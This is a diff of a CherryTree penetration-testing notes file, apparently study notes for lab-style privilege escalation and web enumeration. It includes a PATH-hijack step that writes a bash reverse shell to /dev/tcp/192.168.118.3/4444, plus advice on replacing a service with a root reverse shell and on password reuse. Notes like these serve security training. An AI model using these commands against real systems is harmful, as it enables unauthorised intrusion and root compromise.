@@ -119,7 +119,7 @@ More exploits: </rich_text>
 dig axfr @&lt;DNS_IP&gt; &lt;DOMAIN&gt;</codebox>
           <codebox char_offset="46" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">dig -x {IP} @&lt;DNS_IP&gt;</codebox>
         </node>
-        <node name="HTTP" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569558367" ts_lastsave="1688832531">
+        <node name="HTTP" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569558367" ts_lastsave="1690489967">
           <rich_text>We have to </rich_text>
           <rich_text weight="heavy">Dirbust</rich_text>
           <rich_text> and </rich_text>
@@ -127,7 +127,9 @@ dig axfr @&lt;DNS_IP&gt; &lt;DOMAIN&gt;</codebox>
           <rich_text> using good wordlists:
 - /usr/share/seclists/Discovery/Web-Content/big.txt
 - /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
-- /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt (if medium had no results)
+- /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt (let it </rich_text>
+          <rich_text weight="heavy">run in background</rich_text>
+          <rich_text> while testing other stuff)
 
 Also we have to check:
 - intersting exntensions (</rich_text>
@@ -145,7 +147,14 @@ Also we have to check:
 - check if git is present on the server
 - check page contents, maybe credentials or something helpful is already there
 - check comments
-- check cookies and session</rich_text>
+- check cookies and session
+- </rich_text>
+          <rich_text weight="heavy">FUZZ</rich_text>
+          <rich_text> suspect endpoints; use wordlists from </rich_text>
+          <rich_text style="italic">/usr/share/seclists/Fuzzing</rich_text>
+          <rich_text>
+   → try base64
+   → try URL encoded</rich_text>
           <node name="SQL injections" unique_id="60" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1572496816" ts_lastsave="1688831912">
             <rich_text>- check with quote “ ' ”
 - check the request in network tab for errors
@@ -503,12 +512,16 @@ Check capabilities:
         <codebox char_offset="620" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep "CRON" /var/log/syslog</codebox>
         <codebox char_offset="720" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">getcap -r / 2&gt;/dev/null
 # And search for everyone</codebox>
-        <node name="Special Cases" unique_id="117" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690221496" ts_lastsave="1690222168">
+        <node name="Special Cases" unique_id="117" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690221496" ts_lastsave="1690222214">
           <rich_text>---------------------- Services and Reboot Privs ----------------------
 If we have these SUDO capabilities (sudo -l):
-
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
 We may find writable services inside etc:
-
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
 
 Then we may overwrite this service with one that executes a reverse shell from root, then </rich_text>
           <rich_text weight="heavy">sudo reboot</rich_text>
@@ -542,7 +555,8 @@ More on that here: </rich_text>
 export PATH=/tmp:$PATH
 # and add to that path a reverse shell with the name of that binary system call (called without absolute path)
 echo 'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.118.3/4444 0&gt;&amp;1"' &gt; /tmp/{binary}
-chmod +x /tmp/{binary}</codebox>
+chmod +x /tmp/{binary}
+</codebox>
           <codebox char_offset="827" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hostname
 # If we get gibberish data like "f8e1a236869d", we are in a container and we should escape it =&gt; see services that are on the machine and we could exploit
 # (other services maybe be run by machine itself, not container, and we could gather info about those services from inside the container, to gain RCE
@@ -614,7 +628,7 @@ Get-ChildItem -Recurse | Where {$_.Name -match 'Interesting-Name'} | Select Full
         <codebox char_offset="672" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Get-NetLoggedon</codebox>
         <codebox char_offset="691" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Get-NetSession</codebox>
       </node>
-      <node name="STUCK?" unique_id="111" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1689415044" ts_lastsave="1690138049">
+      <node name="STUCK?" unique_id="111" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1689415044" ts_lastsave="1690490157">
         <rich_text>- Recheck every line of output from Winpeas/Linpeas
 - Recheck files
 - Rerun Winpeas/Linpeas
@@ -650,6 +664,17 @@ Get-ChildItem -Recurse | Where {$_.Name -match 'Interesting-Name'} | Select Full
         <rich_text>
 - Always check kernel version and try all exploits -</rich_text>
         <rich_text weight="heavy"> Only Linux</rich_text>
+        <rich_text>
+- Try </rich_text>
+        <rich_text style="italic">already known passwords</rich_text>
+        <rich_text> to </rich_text>
+        <rich_text weight="heavy">sudo</rich_text>
+        <rich_text> or switch user (</rich_text>
+        <rich_text weight="heavy">su</rich_text>
+        <rich_text>) to root - </rich_text>
+        <rich_text style="italic" weight="heavy">Password Reusal</rich_text>
+        <rich_text> - </rich_text>
+        <rich_text weight="heavy">Only Linux</rich_text>
         <rich_text>
 
 !For some reason samdump2 failed here as the both the NT and LM are coming up as blank for all accounts. T</rich_text>
